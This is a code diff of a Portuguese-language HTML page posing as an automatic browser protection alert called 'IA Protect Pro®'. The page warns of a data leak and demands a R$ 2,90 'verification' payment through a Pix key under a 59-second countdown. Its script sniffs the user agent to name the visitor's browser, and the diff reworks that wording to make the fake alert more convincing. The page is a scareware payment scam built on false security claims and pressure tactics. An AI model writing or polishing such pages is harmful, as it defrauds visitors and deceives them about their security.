@@ -55,7 +55,7 @@
   <div class="logo">🔒 IA Protect Pro®</div>
   <h2>Segurança de conexão ativada</h2>
   <p class="alert">⚠️ Vazamento de dados em potencial detectado.</p>
-  <p>O navegador <strong id="browser-name">seu navegador</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
+  <p><span id="browser-text">O navegador</span> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
   <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
   <h3>Valor único de verificação: R$ 2,90</h3>
   <p>(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
@@ -75,15 +75,13 @@
   <p class="timer">⏳ Sua autenticação expira em <span id="countdown">59</span> segundos.</p>
 
   <!-- DEBUG: Exibir userAgent -->
-  <p class="ua">
-    <strong>User Agent:</strong> <span id="ua-string"></span>
-  </p>
+  <p class="ua"><strong>User Agent:</strong> <span id="ua-string"></span></p>
 
   <script>
     const userAgent = navigator.userAgent;
     document.getElementById("ua-string").textContent = userAgent;
 
-    let browser = "seu navegador";
+    let browser = "";
 
     if (userAgent.includes("Edg/")) {
       browser = "Microsoft Edge";
@@ -97,7 +95,12 @@
       browser = "Safari";
     }
 
-    document.getElementById("browser-name").textContent = browser;
+    const browserText = document.getElementById("browser-text");
+    if (browser) {
+      browserText.textContent = `O navegador ${browser}`;
+    } else {
+      browserText.textContent = `O navegador`;
+    }
 
     function copyPix() {
       const text = document.getElementById("pixKey").innerText;
